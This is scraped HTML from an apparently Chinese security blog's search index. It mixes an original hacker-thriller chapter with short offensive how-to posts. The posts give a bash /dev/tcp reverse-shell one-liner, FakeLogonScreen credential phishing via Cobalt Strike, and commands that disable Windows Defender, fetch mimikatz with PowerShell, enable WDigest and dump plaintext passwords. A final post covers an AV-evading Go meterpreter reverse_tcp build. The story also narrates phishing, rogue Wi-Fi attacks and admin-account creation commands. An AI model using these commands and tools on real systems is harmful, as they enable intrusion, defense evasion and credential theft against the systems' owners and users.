&lt;p&gt;天际流火叩响大地之门，岁月星辰刻画沧桑年轮。&lt;/p&gt;
&lt;p&gt;纵横交错兮天下之局，谁能参悟兮世事如棋。&lt;/p&gt;
&lt;h2 id=&#34;黑客兵器谱&#34;&gt;黑客兵器谱&lt;/h2&gt;
&lt;p&gt;wywz：中文名无影无踪，一款擦除电脑硬盘数据的工具，使用该工具删除的文件，擦除入侵痕迹，将很难被恢复。&lt;/p&gt;
&lt;h2 id=&#34;注解&#34;&gt;注解：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;注解1：后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;注解2：“特洛伊木马”（trojan wooden-horse），简称“木马”。特洛伊木马目前一般可理解为“为进行非法目的的计算机病毒”，在电脑中潜伏，以达到黑客目的。原指一希腊传说。在古希腊传说中，希腊联军围困特洛伊久攻不下，于是假装撤退，留下一具巨大的中空木马，特洛伊守军不知是计，把木马运进城中作为战利品。夜深人静之际，木马腹中躲藏的希腊士兵打开城门，特洛伊沦陷。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;注解3:DoS是Denial of Service的简称，即拒绝服务，造成DoS的攻击行为被称为DoS攻击，其目的是使计算机或网络无法提供正常的服务。文章中提到的Dos，指的是一种Redos漏洞，可使你CPU占满，导致系统出现异常。具体内容可自行百度了解。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;文中提到的现实人物：Jack(Piaca).&lt;/p&gt;
">原创小说《杀手》第二章 黑夜来临</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Killer-Chapter-One/"" data-c="
          &lt;p&gt;杀手是在生活中受到雇主的雇佣，而去执行杀人任务，最终获得报酬。他们孤独，不轻易相信其他任何的人。他们非常冷酷，面对生命，他们从来不会手下留情。因为杀人就是她们的存在的意义。很少有人见过他们，因为大多数见过他们的人，都已经被杀死掉了。他们平时白天不出门，只有在夜里才开始行动，他们出去都会戴上墨镜，头顶一顶鸭舌帽，有时候以雾霾为由戴上口罩。其实，他们只是不想别人知道他们的真正面目。他们活在黑暗的世界里，不见天日。他们很可怜，没有爱情，没有亲情，甚至连个朋友都没有。&lt;/p&gt;
&lt;p&gt;在网络的世界中也有这样的一种人，他们不杀人，他们也不需要在现实中隐藏包装自己，因为他们只存在于虚拟的网络世界中，很少有人知道他们的真面目。他们同样在夜间才进行活动，他们的任务是窃取企业，政府的最高机密信息。更准确的说，可以叫他们为网络间谍。他们是这个网络上的杀手，他们不会亲自杀人，却因为他们盗取的信息，有他们的买家来去做一些伤天害理的事情，使很多人因此而家破人亡。不过，对于这个世界来说，每个人都有着他自己的命运，弱者注定要被这个社会淘汰，而这个也正是杀手们所认同的，在杀手已活着网络杀手看来，他们可以杀死（入侵的目标）的人都是弱者。他们信奉他们自己可以改变或控制别人的命运，甚至大多数人的命运。&lt;/p&gt;
&lt;h2 id=&#34;登场&#34;&gt;登场&lt;/h2&gt;
&lt;p&gt;“早～”，小楠对刚刚到公司的王梓打招呼。王梓则开心的笑笑，作为回应。&lt;/p&gt;
&lt;p&gt;王梓是一家中日合资的中型软件公司的程序员。性格内向，腼腆。长相一般，在嘴巴的右上角有一颗痦子。在这家拥有数十位的程序员的公司，每个人都只负责各自的一部分，王梓在这里是其中普普通通的一员，公司部门内部竞争激烈，升职也比较困难，王梓不时还会犯些小错误，因为被领导破口大骂。对此王梓什么都不说，只在一旁听着，完事后继续回到座位上默默的工作。这时候，作为翻译的小楠总会过来安慰王梓。王梓也总说是他自己的错误。不怪领导发脾气。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt;“他怎么不对别人发脾气？他就是看你老实，他心情不好，拿你出气你还看不出来么。”小楠愤愤不平道。因为她看不惯领导这样的行为，不过她也只能说说，对此她也没有任何的办法。&lt;/p&gt;
&lt;p&gt;“领导也是为我好～”，说完傻笑。&lt;/p&gt;
&lt;p&gt;“你呀你，真是拿你没办法，你也别太老实了，我看呀，你以后也别叫王子了，叫你傻子好了”&lt;/p&gt;
&lt;p&gt;王梓的脸上依旧傻笑着，也没在说什么，也没有反驳。&lt;/p&gt;
&lt;p&gt;小楠是公司里的一位大美女，有一双清澈明亮的眼睛，弯弯的柳眉，长长的睫毛微微地颤动着，白皙无瑕的皮肤透出淡淡红粉。你在看她说话的的时候，你很容易不自觉的沉醉于她的眼神里。直到你脸上火辣的痛让你瞬间清醒过来。小楠用她那芊芊玉手打在王梓的脸上。当王梓要解释的时候，小楠已经转身离开。&lt;/p&gt;
&lt;p&gt;对于小楠这样公司里的大美女，身边当然不乏许许多多的追求者，但是，都被小楠拒绝了。但依然有人不放弃，每天都会送花给小楠，而小楠统统将他们喂给刚刚清理过的垃圾桶里。如果王梓有时看到了，就会对小楠说：”这些花这么漂亮丢掉了多可惜啊。“而小楠则总是回他道：”你喜欢你拿去喽，反正我不要，你也别问我为什么“。王梓也不敢在继续问下去，就会到自己的座位，去敲他的代码。&lt;/p&gt;
&lt;p&gt;夜幕降临，马路上排满了长长的车队，每隔一会就会传来鸣笛的声音。使得这个夜更加的喧闹。王梓打开房门，开了灯，眼前是一间50多平米的屋子，在客厅中摆放了3台电脑，4个显示器。显示器上显示着一个世界地图，地图上显示了很多闪烁的圆点，点会有一条线与另外一个同样的点连接，这些点会不断的变换。这个是实时显示的是王梓部署的一些监控点，显示了哪些地方的电脑（服务器）正在发生着攻击，或者已经被攻击了。这是王梓的一个僵尸网络，也就是在他的肉机上作了监控，他监控这些信息为了对时间发现哪些已经被多人控制，是否有人对他进行反查。一旦发现这些，王梓会第一时间收到报警，收到报警后他可以选择是否启动证据销毁和自毁这一操作。&lt;/p&gt;
&lt;p&gt;王梓在白天的时候他是一名程序员，但是到了晚上，他的身份则是一名网络黑客。而他的另一个职业就是网络杀手，他的代号是——47，杀手47。他的网络id是killer47.知道他这一身份的是一名他从小长大的警察朋友——石磊。由于他俩关系非常要好，石磊并没有抓王梓。可以说石磊石王梓最信任的朋友，也是一个唯一信任的朋友。&lt;/p&gt;
&lt;p&gt;王梓煮了一份泡面，煮好后，做到他的核武器面前，这几台电脑是自己定制化的设备。专门用来他工作用，这里面，由他自己设计并制作的，人员信息检索系统，可以查到大部分国内人员的基础信息，以及一些相关记录，如开房记录，外卖，行程，购物，体检，以及还有个人履历。还有他这套远程监控程序，其中除了监控之外，还可以进行远程操控的功能。都是王梓自己一个人制作的。除了这些之外，还有一套定制化的攻击系统。系统中不仅包含公开的黑客工具，如nmap，metasploit，sqlmap等，还包含了一些0day程序。整套系统乃至所有的硬盘数据都是经过加密，从硬件的硬盘密码加密，在到软件的系统数据加密。密码都设置的非常复杂，并深深的印在王梓的大脑里。就算有人拿到电脑或者硬盘没有密码也无济于事。而且这些系统可以接收手机的控制指令，远程销毁数据。&lt;/p&gt;
&lt;p&gt;对于网络的通信，这套系统与王梓部署在国外5台小的个人的idc机房中的服务器，这些服务器是匿名的，不再政府那里登记的，这些也同样进行了加密和销毁程序。5台服务器中3台在使用中，另外2台是处于备用状态。5台服务器分别分布在香港，日本，美国，韩国，英国。&lt;/p&gt;
&lt;p&gt;王梓的电脑系统在去行动之前会利用加密的协议接入这些系统中，系统中都会连接如tor的匿名网络中，利用这些匿名网络连接如肉鸡（被黑客控制的电脑叫肉鸡）或者跳板（通过肉鸡去进行入侵）。该连接会经过3层，也就是先连接到香港服务器，再通过该服务器连接的tor网络连接日本服务器。日本服务器会以同样的方式连接到韩国服务器。优先使用该服务器是因为这几台服务器连接速度快。&lt;/p&gt;
&lt;p&gt;这一整套的系统，花了王梓5年时间，王梓对这套系统很自豪，很满意。&lt;/p&gt;
&lt;h2 id=&#34;行动&#34;&gt;行动&lt;/h2&gt;
&lt;p&gt;做为一名杀手要隐藏自己的气息，让敌人从来不会感觉到他们的存在。当敌人放松警惕时，杀手们会抓住最佳时机，一击毙命。他们是潜藏在黑夜中的普通人。&lt;/p&gt;
&lt;p&gt;王梓打开了他的收件箱，是一封pgp加密邮件，解密的邮件内容只有一个单词“help”。王梓懂的这是什么意思，他在自己的聊天服务器上开通了一个账号，发送给了对方，并一起发送了一个聊天软件的下载地址。该聊天系统是也是架设在网络上的服务器，聊天内容通过端到端的加密，服务器上也不会保存任何的聊天记录。（备注：其irc纯文本聊天服务和客户端，另外还有可选择的是xmpp协议的聊天软件）。&lt;/p&gt;
&lt;p&gt;“Mr.Killer47,我要获取天成制药的客户资料，同时销毁他们的客户名单，删除制药配方”&lt;/p&gt;
&lt;p&gt;“价格！”&lt;/p&gt;
&lt;p&gt;“二十万”&lt;/p&gt;
&lt;p&gt;“太少了，五十万”&lt;/p&gt;
&lt;p&gt;“你这胃口太大了”&lt;/p&gt;
&lt;p&gt;“我想你比我更清楚事情成功后给你们带来的利益，我拿到只是很少的一部分。”&lt;/p&gt;
&lt;p&gt;“好，成交”&lt;/p&gt;
&lt;p&gt;“50万转换成比特币，比特币转到128CcTcBb4d5NSjpDKktGjS7B6oErsNLqG 这个地址，3个月后给你结果”&lt;/p&gt;
&lt;p&gt;“我需要点时间准备下”&lt;/p&gt;
&lt;p&gt;“给你3天时间，交80%的钱后我开始行动，如果做不到，免谈！”&lt;/p&gt;
&lt;p&gt;随后47就把这个人踢下线了。不给对方解释的机会。&lt;/p&gt;
&lt;p&gt;天成制药显然是这个客户的竞争对手，而且能够找到47的，都是别人搞不下的任务才会找到他。&lt;/p&gt;
&lt;p&gt;王梓每天白天如往常一样正常的上班，晚上则来渗透该天成制药公司的网络。在这个期间，他推掉了其它的任务。&lt;/p&gt;
&lt;p&gt;47把任务的目标导入了他的自动化信息收集系统，该系统是一个比nosec.org中更加智能和强大的网络，可自动的关联对方的服务器，网站，ip地址，开放的服务，员工信息（包括密码），网络拓扑，以及企业信息。该系统还会通过github.com网站查找该企业所使用的源代码。这个让他的渗透效率提高了很多。获取了这些信息就可以进行接下来的入侵方案。&lt;/p&gt;
&lt;p&gt;根据目前所获取的信息，既然他的同行都无计可施。常规的攻击自然不用去考虑。而这次攻击任务的目标企业不在北京市，所以无法真人去对企业进行社会工程学。&lt;/p&gt;
&lt;p&gt;做网络杀手去入侵与常规的渗透测试方式不同，隐蔽性非常重要，一切都要悄无声息中进行，不能让对方有所察觉。要摧毁和获取数据，更要长期潜伏，不到最后一刻不能进行一些过猛的操作。而且在达到目标后要对痕迹进行擦除。&lt;/p&gt;
&lt;p&gt;制定方案是定要严谨，要确保万无一失才可进行攻击。经过一周的分析考虑。47制定好了一份方案。&lt;/p&gt;
&lt;p&gt;在这一周的时间内，47做了如下工作事情。&lt;/p&gt;
&lt;p&gt;首先给他们北京地区的业务人员拨打电话。他所使用的电话号码是临时的号码，不实名，同时使用的不是智能手机。并且尝试改变了一下说话的声音。&lt;/p&gt;
&lt;p&gt;“你好，是天成制药的林先生么？”&lt;/p&gt;
&lt;p&gt;”我是，请问您是？有什么事情么？“，对方不知道来意。&lt;/p&gt;
&lt;p&gt;”我是xx医院的李主任，目前看到你们公司新研制并发布的一种药物，我看了后，考虑把你们这个新药品用到我们的临床上来，想要与你们进行合作。“王梓假装成为他们的合作客户。&lt;/p&gt;
&lt;p&gt;”这样啊，那真的是太好了，能够与贵医院合作，那对我们的发展是很有利的。“对方听到这个后没有怀疑，而且当时表现出兴奋。当然兴奋也难怪，能够促成此单，他一年的营业额都够了。&lt;/p&gt;
&lt;p&gt;”那你看咱们是否可以当面聊聊？“&lt;/p&gt;
&lt;p&gt;”好啊，那我明天就去上门拜访您？你看方便么？“&lt;/p&gt;
&lt;p&gt;”明天我的班儿，所以不行，我下班后在附近的咖啡厅等你。“&lt;/p&gt;
&lt;p&gt;”好好，明天见“&lt;/p&gt;
&lt;p&gt;第二天，47买了几张创可贴，贴在手指和眉毛上。并准备戴了口罩，鸭舌帽。鞋跟垫高了3厘米，并以自己生病为由请了一天病假，他提前到所说的医院附近咖啡厅，在咖啡厅内利用设备伪造了一个与咖啡厅一样的无线热点。并开启Deauthentication攻击把咖啡厅无线网络攻击瘫痪。&lt;/p&gt;
&lt;p&gt;等到业务人员来时，他说自己突然病了为由，来解释他戴口罩。因为业务人员带来了笔记本电脑，他引导业务人员连接了他伪造的无线网络，并对该网络进行了嗅探。但是，可惜的是，对方的vpn系统使用了双因子验证，而且连入的oa系统使用了https协议。一切似乎看起来并不容易。当然他通过对网络的劫持，在对方访问的网站加入了挂马代码（访问该页面即可被安装免杀的电脑控制程序。）。控制该电脑，可以监控一些通讯录等信息。在两个人离开咖啡厅后，47停止了攻击，恢复了咖啡厅的网络。并清理了电脑里的一些运行记录等。同时破坏并销毁了伪造的设备。&lt;/p&gt;
&lt;p&gt;在这台电脑中，47观察来几天，发现除了可以看到一些与总部那边以及及格客户的邮件外，别的没有什么有价值信息。47又以发送资料的情况以及一些要求活着资质为由，给对方发送了一份带有恶意代码的文档。该文档，会把文档发给总部。对方业务人员因为太想急于促成这个事情，当天就把文档发给了总部。第二天，总部那边的就有3台电脑上线了，现在47可以控制总部3台员工的电脑了。这对他接下来的入侵有很大的帮助。&lt;/p&gt;
&lt;h2 id=&#34;对手出现&#34;&gt;对手出现&lt;/h2&gt;
&lt;p&gt;台湾某安全公司内&lt;br&gt;
总监办公室内，一位身穿黑色西服，留着利落短发的人正坐在电脑前认真的盯着屏幕，双手在苹果键盘上敲打着，一张帅气的脸，还有那干净的鬓发看上去洒脱从容。突然有一个人敲了三下他的门，他停下正在敲击键盘的手，微微转了下头，看到敲门的人是他的手下小张，说了句：“进来，有什么事？”。小张走近屋子里，接着说：“最近几天我们发现有几个新发现的ip地址（ip地址：IP地址是指互联网协议地址（英语：Internet Protocol Address，又译为网际协议地址），是IP Address的缩写。IP地址是IP协议提供的一种统一的地址格式，它为互联网上的每一个网络和每一台主机分配一个逻辑地址，IP地址通常用“点分十进制”表示成（a.b.c.d）的形式，其中，a,b,c,d都是0~255之间的十进制整数。例：点分十进IP地址（100.4.5.6）。ip地址相当于网络中的门牌地址。通过它可以实现网络通信。具体不细讲解。读者感兴趣的可自行了解。）扫描很频繁。扫描的范围很大。我觉得有必要对其进行深入的反跟踪，去查一查这个是否有一个团伙在作案。”。&lt;/p&gt;
&lt;p&gt;“哦？有趣哦～你把这几个ip地址还有相关信息发过来看看”。他的脸上略带一点喜悦。&lt;/p&gt;
&lt;p&gt;“好，我这就回去给你发送。”&lt;/p&gt;
&lt;p&gt;“去吧～”。接着又补充道：“还有，继续跟踪下去，看可否追根溯源，找到攻击者。”&lt;/p&gt;
&lt;p&gt;小张点头离去。&lt;/p&gt;
&lt;p&gt;他继续敲击键盘，做刚才停下的事情。&lt;/p&gt;
&lt;p&gt;此人网络id是hip，在一家网络安全公司做安全总监，他看上去也就二十三四的样子，从相貌上来看一点不像个做总监的，但是当了解他的技术以及能力之后，你不得不对他竖起大拇指。当然，你也不会想到年轻的他开的是一辆宝马i8。&lt;/p&gt;
&lt;p&gt;对于他的id，他不仅是一名技术专家，还曾经是一名狂热的hiphop舞者，曾经获得台湾地区的hiphop冠军。不过那都是他学生时代的事情了。他用hip这个id也是缘于此。后来一直没有改。&lt;/p&gt;
&lt;p&gt;hip还创建了一只网络安全技术交流小组——insight labs。insight labs是一个国际安全组织，组织成员分布在全世界各国。他们大多数都是各大互联网公司的安全研究员，安全工程师，安全总监，少数还有创业的。他们是一群白帽子，不作坏事，不攻击别人，他们对技术保持着一种狂热，保持着黑客的原则以及黑客精神。他们每周都会在自己加密的irc（IRC：Internet Relay Chat的英文缩写，中文一般称为互联网中继聊天。它是由芬兰人Jarkko Oikarinen于1988年首创的一种网络聊天协议。纯文本聊天，国外很流行，全世界有很多公开的服务器，分别有不同的频道，文中所使用的是自己构建的服务。为什么不使用qq这类，主要因为涉及到一些私密性。当然，在互联网的世界中，有很多基于该协议通信的恶意程序。我们称该类为ircbot。ircbot这里先不细讲。）上交流技术，最新的动态等。&lt;/p&gt;
&lt;p&gt;hip所在的公司在德国，美国，韩国，日本，以及中国大陆，香港均部署了蜜罐系统（蜜罐：蜜罐是一种用来通过构建虚拟的网络服务或者协议等来引诱黑客来进行攻击。蜜罐是一种故意构造为容易被攻击的目标，这样可以了解黑客的攻击行为，随时了解最新的攻击和漏洞，还可以通过窃听黑客之间的联系，收集黑客使用的工具，找到攻击者。也可使说蜜罐是一种收集情报的方式。）。用于捕获并监控互联网中的恶意攻击行为，发现恶意攻击者。&lt;/p&gt;
&lt;p&gt;过了一会，hip的屏幕右下方收到了一封邮件提醒，他点开了邮件看到：&lt;/p&gt;
&lt;p&gt;攻击者ip地址如下：&lt;/p&gt;
&lt;p&gt;38.99.82.191美国&lt;/p&gt;
&lt;p&gt;72.52.4.90美国&lt;/p&gt;
&lt;p&gt;198.204.250.242美国&lt;/p&gt;
&lt;p&gt;82.165.37.26德国&lt;/p&gt;
&lt;p&gt;以上4个ip地址都是一样的攻击行为，他们会对互联网中的计算机去进行ssh（ssh：SSH为Secure Shell的缩写，由IETF的网络小组（Network Working Group）所制定，是一种安全的传输协议，SSH是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。）弱口令扫描，java反序列化命令执行（java反序列化命令执行：java所编写的程序的一种高危害漏洞。可自行深入了解。）。这是最近几天新增加的，攻击行为异常频繁。&lt;/p&gt;
&lt;p&gt;根据从我们的目前的威胁情报来分析，这几个ip地址的服务器都处在合法的idc机房当中。应该也是被入侵的计算机，受到攻击者的控制。进一步的信息，会继续对其进行溯源跟踪。&lt;/p&gt;
&lt;p&gt;hip看了邮件后，他打开了mirc（一款irc的客户端软件），进入了insight labs的频道。&lt;/p&gt;
&lt;p&gt;“hi，guys，最近新发现了几个活跃的攻击者ip地址，大家有没有兴趣看看的？：）”。&lt;/p&gt;
&lt;p&gt;因为组织里只有两名女性，其余大多都是男性，所以，大家都是以基友相称。在网络世界里，大家从不过问彼此的真实姓名，年龄。他们在网络里只有自己的网络id。&lt;/p&gt;
&lt;p&gt;“这个我有兴趣哦～，发出来看看～”，在奇护公司的小白首先回应了，奇护公司是国内知名的杀毒软件公司，其名字奇护是奇袭的护卫神的缩写。奇护是杀毒行业是后起之秀，而小白是这家公司的一名刚毕业不久的安全工程师。经验不多，接触黑客有2年时间，基础不错，小伙子因为对新鲜的知识充满了渴望，对很多事情都是冲在最前。这次他也不例外。&lt;/p&gt;
&lt;p&gt;“好，这就发你。”说这，hip把ip地址发给了小白。&lt;/p&gt;
&lt;p&gt;“这是几个ip地址，目前判断，也是被入侵的服务器。有什么新的消息告诉我下。”&lt;/p&gt;
&lt;p&gt;“ok～，太好了，又可以实战学习新的东西了。”，小白有些兴奋的回复到。对他来说，是一次实战的大好机会。&lt;/p&gt;
&lt;p&gt;“组织里其他有兴趣的人，到时候你们可以一起。”&lt;/p&gt;
&lt;p&gt;“好的～”&lt;/p&gt;
&lt;p&gt;这时电脑前的hip感叹到，年轻就是好啊！&lt;/p&gt;
&lt;p&gt;就这样，小白如打了鸡血般，异常的兴奋，晚上几乎没有睡觉，放着Linken park的音乐，对4个ip地址逐个进行检测。通过几个小时的功夫，他发现了德国服务器的一个漏洞，该服务器是windows操作系统，存在着微软sql server数据库弱口令。当屏幕上的黑客工具显示：“82.165.37.26弱口令存在，用户名sa，密码821653726”（注：该口令为ip地址不加点）。只见他微微一笑，眯缝着的小眼睛里放出一丝光芒，仿佛胜利就在眼前。&lt;/p&gt;
&lt;p&gt;他迅速使用查询分析器（一款数据库操作工具）连接了对方的目标，当显示连接成功时，他打了一个响指，并喊了一句哦耶！通过之前获取的信息，对方开放了远程登录服务，小白直接执行添加管理员的命令（添加管理员命令：在命令提示符下输入先添加用户名，在把用户名假如管理员组。添加新用户：net user用户名密码/add.添加用户名到管理员组：net localgroup administrators用户名/add）。顺利的登陆进了该德国服务器。没想到这么顺利救入侵了这台服务器，小白首先建立了一个系统的隐藏账户（克隆了一个账户）。通过查看进程，端口开放情况，这样来确认扫描程序的位置。这时他发现scan.exe的进程连接来很多其他的计算机，并且失败状态显示失败。说明他就是小白要找攻击者的扫描程序了。小白快速的下载了该程序到自己的电脑中。又查找了一下是否还有其他的恶意程序，确认没有后。接着，他在对方计算机系统的管理员桌面放了一个readme.txt的文档，里面写入了“Your computer has been hacked.Please fix it，thx～”.然后他清理了系统日志就下线了。&lt;/p&gt;
&lt;p&gt;小白启动了他的虚拟机，创建了一个虚拟机快照。接下来，他把scan.exe程序拷贝入虚拟机中，抄起他的兵器库中的十八般武器，开始对scan.exe程序施刑，先用peid查看该恶意程序是否加壳，结果没有加壳。没有加壳的程序就如同一个只穿内衣的女人，你接下来要做的就是想办法拔掉女人内衣，就可以一览无余了。接下来直接ida进行分析，程序闪过了几个窗口之后，程序代码的执行流程就展现在小白面前了，当然还需要对其进行进一步的分析。通过该程序的string窗口，小白发现了一个字母by phantoms。这应该是编写该程序的作者。小白接着花了一些程序时间看了解了下程序运行原理，这个是一款扫描的程序。在扫描到流程后，会自动的登陆对方系统，根据系统不同去下载一款对应系统的木马程序。小白根据下载地址，下载了全部类型的木马程序。由于该程序有一款是linux系统下，小白对linux不熟悉，而这时候天已经亮了，他把目前的结果给hip留言后，就洗漱去上班了。&lt;/p&gt;
&lt;p&gt;此时另外一边的杀手47，还在继续着他的任务，而杀手47还不知道，在不久的未来里，将会与insight labs组织发生不可思议的战斗。&lt;/p&gt;
&lt;p&gt;（未完待续）&lt;/p&gt;
&lt;p&gt;注解（术语解释）：&lt;br&gt;
1、IRC：Internet Relay Chat的英文缩写，中文一般称为互联网中继聊天。它是由芬兰人Jarkko Oikarinen于1988年首创的一种网络聊天协议。纯文本聊天，国外很流行，全世界有很多公开的服务器，分别有不同的频道，文中所使用的是自己构建的服务。为什么不使用qq这类，主要因为涉及到一些私密性。当然，在互联网的世界中，有很多基于该协议通信的恶意程序。我们称该类为ircbot。ircbot这里先不细讲。&lt;/p&gt;
&lt;p&gt;2、ip地址：IP地址是指互联网协议地址（英语：Internet Protocol Address，又译为网际协议地址），是IP Address的缩写。IP地址是IP协议提供的一种统一的地址格式，它为互联网上的每一个网络和每一台主机分配一个逻辑地址，IP地址通常用“点分十进制”表示成（a.b.c.d）的形式，其中，a,b,c,d都是0~255之间的十进制整数。例：点分十进IP地址（100.4.5.6）。ip地址相当于网络中的门牌地址。通过它可以实现网络通信。具体不细讲解。读者感兴趣的可自行了解。&lt;/p&gt;
&lt;p&gt;3、蜜罐：蜜罐是一种用来通过构建虚拟的网络服务或者协议等来引诱黑客来进行攻击。蜜罐是一种故意构造为容易被攻击的目标，这样可以了解黑客的攻击行为，随时了解最新的攻击和漏洞，还可以通过窃听黑客之间的联系，收集黑客使用的工具，找到攻击者。也可使说蜜罐是一种收集情报的方式。&lt;/p&gt;
&lt;p&gt;4、ssh：SSH为Secure Shell的缩写，由IETF的网络小组（Network Working Group）所制定，是一种安全的传输协议，SSH是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。&lt;/p&gt;
&lt;p&gt;5、java反序列化命令执行：java所编写的程序的一种高危害漏洞。可自行深入了解。&lt;/p&gt;
&lt;p&gt;6、添加管理员命令：在命令提示符下输入先添加用户名，在把用户名假如管理员组。添加新用户：net user用户名密码/add.添加用户名到管理员组：net localgroup administrators用户名/add&lt;/p&gt;
&lt;p&gt;（未完待续）&lt;/p&gt;
">原创小说 《杀手》 第一章 网络杀手</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/share-explainshell/"" data-c="
          &lt;p&gt;有的时候我们会遇到一些特别难理解的shell命令，或者是一些参数我们不知道它的作用。那么今天分享的这个网址可以帮助解决上面的烦恼。&lt;/p&gt;
&lt;p&gt;网站主页打开后就是一个输入框。输入命令后，就会给出解析的结果。结果包含了解析的结果，并在下面给出了详细的说明。很方便。例如我们以&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1&lt;/code&gt; 为例（如下图），很酷～&lt;/p&gt;
&lt;!-- more --&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1583390496770.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;该网站有两种主题，分别是Light和Drak。&lt;/p&gt;
&lt;p&gt;网址：&lt;a href=&#34;https://explainshell.com/&#34;&gt;explainshell&lt;/a&gt;&lt;/p&gt;
">分享个学习shell脚本或辅助理解的网站-explainshell.com</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Fake-Windows-Logon-Screen-To-Steal-Passwords/"" data-c="
          &lt;p&gt;在windows环境中，获取系统密码，提升系统权限。在渗透测试是经常遇到的。今天这里介绍一款伪造windows登录屏幕以达到窃取密码或题全的软件——FakeLogonScreen。&lt;/p&gt;
&lt;h2 id=&#34;简介&#34;&gt;简介&lt;/h2&gt;
&lt;p&gt;FakeLogonScreen这个程序是用于伪造windows登录凭证以获取系统登录密码。它会获取当前系统配置的背景图片，这样显得更加真实，成功率也会更高。&lt;/p&gt;
&lt;p&gt;另外，该程序会对输入的密码进行Active Directory或本地计算机的认证，以确保窃取密码的准确性。它可以显示在控制台，也可以保存早文件远程系统的硬盘上。&lt;/p&gt;
&lt;p&gt;这个软件的好处就是可以与其它工具配合使用，可以直接通过内存执行（无文件）。比如可以配合Cobalt Strike的execute-assembly来执行。&lt;/p&gt;
&lt;h2 id=&#34;运行环境&#34;&gt;运行环境&lt;/h2&gt;
&lt;p&gt;由于使用c#编写，需要系统中有.net framework框架。这里测试windows10和windows7，系统均为64位。在其release的版本中，作者给出来.net framework3.5和4.5的可执行程序。适用于windows7 和windows10等情况。实际中可根据实际情况进行选择。&lt;/p&gt;
&lt;h2 id=&#34;利用&#34;&gt;利用&lt;/h2&gt;
&lt;p&gt;可以配合Cobalt Strike，系统上线后，进入到beacon中，然后直接执行&lt;code&gt;execute-assembly /root/Desktop/FakeLogonScreen.exe&lt;/code&gt; 。（后面为控制机上的文件路径，非被控机的路径）。接下来就是等待对方输入密码，即可在进入的beacon中显示输入的密码了。效果图如下：&lt;/p&gt;
&lt;!-- more --&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1583209455350.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;也可以使用FakeLogonScreenToFile.exe 在本地执行后，然后去查看文件。&lt;/p&gt;
&lt;p&gt;当然这个程序也有些问题，就是windows7也显示windows10样式的窗口，同时，界面显示仍然与系统原有的有区别，但是对于安全意识低的员工还是有作用的。&lt;/p&gt;
&lt;p&gt;软件地址：&lt;a href=&#34;https://github.com/bitsadmin/fakelogonscreen&#34;&gt;FakeLogonScreen&lt;/a&gt;&lt;/p&gt;
">伪造windows登录屏幕窃取密码之FakeLogonScreen</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Windows-Server-2016-Get-Plaintext-Password/"" data-c="
          &lt;p&gt;临时禁止Windows Defender&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;REG ADD &amp;quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&amp;quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f
gpupdate /force
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;下载mimikatz后解压缩。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;powershell.exe -NoP -NonI -Exec Bypass -Command &amp;quot;&amp;amp; {Import-Module BitsTransfer; Start-BitsTransfer &#39;http://你的服务器/mimikatz_trunk.zip&#39; &amp;quot;%APPDATA%\mimikatz_trunk.zip&amp;quot;}&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;修改注册表开启UseLogonCredential&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;等用户下次再登录的时候,可抓到明文密码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mimikatz.exe privilege::debug
sekurlsa::logonpasswords exit
&lt;/code&gt;&lt;/pre&gt;
&lt;!-- more --&gt;
">Windows Server 2016抓取明文密码</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/golang-x86-meterpreter-reverse-tcp/"" data-c="
          &lt;p&gt;Golang实现的x86下的Meterpreter reverse tcp。地址：&lt;a href=&#34;https://github.com/insightglacier/go_meterpreter&#34;&gt;https://github.com/insightglacier/go_meterpreter&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;做静态免杀实验，代码修改自&lt;a href=&#34;https://github.com/EgeBalci/EGESPLOIT&#34;&gt;EGESPLOIT&lt;/a&gt; 这个开源项目。单独实现主要在于减小程序编译后体积。目前编译后的大小在1.2M左右。&lt;/p&gt;
&lt;h2 id=&#34;使用方法&#34;&gt;使用方法&lt;/h2&gt;
&lt;p&gt;修改go_meterpreter.go中125行代码 s := &amp;quot;http://192.168.121.131:8989&amp;quot; IP和端口修改为自己的地址。然后就可以go build了。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;set GOARCH=386
go build -ldflags=&amp;quot;-H windowsgui -w&amp;quot;   
&lt;/code&gt;&lt;/pre&gt;
